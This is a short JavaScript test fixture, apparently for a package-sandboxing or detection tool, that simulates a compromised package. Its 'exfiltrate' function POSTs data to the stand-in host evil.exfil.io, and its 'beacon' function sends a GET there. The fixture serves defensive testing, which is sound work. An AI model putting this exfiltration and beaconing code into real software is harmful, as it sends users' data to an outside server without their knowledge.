/**
 * malicious-net fixture
 * Simulates a compromised package that phones home via HTTPS.
 */
'use strict'
const https = require('https')

module.exports = {
  /** Attack: POST stolen data to attacker's server */
  exfiltrate: function (data) {
    return new Promise((_resolve, reject) => {
      const req = https.request(
        { host: 'evil.exfil.io', path: '/collect', method: 'POST', port: 443 },
        () => { /* intentionally empty */ }
      )
      req.on('error', reject)
      req.write(String(data))
      req.end()
    })
  },
  /** Attack: GET request to attacker server */
  beacon: function () {
    return new Promise((_resolve, reject) => {
      const req = https.get('https://evil.exfil.io/beacon', () => { /* empty */ })
      req.on('error', reject)
    })
  },
}
